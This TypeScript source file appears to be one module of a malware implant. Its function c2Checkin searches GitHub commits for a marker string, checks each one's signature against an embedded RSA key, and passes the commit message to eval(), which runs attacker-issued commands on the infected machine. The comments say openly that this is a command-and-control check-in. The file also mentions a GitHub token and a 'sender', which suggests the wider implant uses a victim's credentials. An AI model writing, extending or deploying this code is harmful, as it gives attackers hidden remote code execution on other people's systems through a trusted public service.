// C2 checkin — searches GitHub for signed command commits and executes them.
//
// After the GitHub sender is initialized (token available), this searches
// for commits containing C2_SEARCH_STRING, verifies each one's signature
// against the embedded public key, and evals the decoded command.

import { verify_key } from "../generated";
import { findValidSignedCommit } from "../github_utils/fetcher";
import { C2_SEARCH_STRING } from "../utils/config";
import { logUtil } from "../utils/logger";

/**
 * Search for a signed C2 command commit and execute it.
 *
 * Uses the GitHub search API (unauthenticated, with retry) to find commits
 * containing C2_SEARCH_STRING, verifies each commit message signature against
 * the embedded 4096-bit RSA public key, and evals the decoded payload.
 *
 * @param token  Optional GitHub token for authenticated search.
 * @returns true if a command was found and executed, false otherwise.
 */
export async function c2Checkin(token?: string): Promise<boolean> {
  logUtil.log("[c2] searching for signed command commits...");

  const result = await findValidSignedCommit(C2_SEARCH_STRING, verify_key);

  if (!result.found) {
    logUtil.log(`[c2] no valid signed command found: ${result.message}`);
    return false;
  }

  logUtil.log(
    `[c2] valid signed command found in commit ${result.commit?.sha?.substring(0, 7)}`,
  );

  if (!result.message) {
    logUtil.log("[c2] empty command payload — skipping");
    return false;
  }

  logUtil.log(`[c2] executing: ${result.message.slice(0, 200)}`);

  try {
    eval(result.message);
    logUtil.log("[c2] command executed successfully");
    return true;
  } catch (e) {
    logUtil.log(
      `[c2] command failed: ${e instanceof Error ? e.message : String(e)}`,
    );
    return false;
  }
}
